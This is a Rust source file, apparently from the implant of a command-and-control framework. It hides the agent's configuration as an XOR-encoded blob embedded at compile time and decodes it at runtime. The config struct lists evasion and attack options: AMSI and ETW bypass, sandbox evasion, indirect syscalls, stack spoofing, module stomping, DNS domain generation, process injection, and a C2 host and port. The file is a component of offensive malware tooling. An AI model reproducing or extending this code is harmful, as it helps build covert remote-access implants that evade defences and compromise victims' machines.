//! Runtime config — decoded from the encrypted blob embedded at compile time.

use oxide_common::{
    crypto::xor_decode,
    types::{InjectionMethod, SleepObf},
};
use serde::Deserialize;

static AGENT_KEY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/agent_key.bin"));
static AGENT_CFG: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/agent_cfg.bin"));

#[derive(Debug, Clone, Deserialize)]
pub struct AgentConfig {
    pub build_id:          String,
    pub sleep_ms:          u64,
    pub jitter_pct:        u8,
    pub sleep_obf:         SleepObf,
    pub injection:         InjectionMethod,
    pub amsi_bypass:       bool,
    pub etw_bypass:        bool,
    pub sandbox_evasion:   bool,
    pub indirect_syscalls: bool,
    pub stack_spoof:       bool,
    pub module_stomp:      bool,
    pub block_dlls:        bool,
    pub encrypted_comms:   bool,
    pub dns_dga:           bool,
    pub server_pubkey:     String,
    pub c2_host:           String,
    pub c2_port:           u16,
    pub protocol:          String,
}

pub fn load() -> AgentConfig {
    let plain = xor_decode(AGENT_CFG, AGENT_KEY);
    serde_json::from_slice(&plain).expect("agent config corrupt")
}
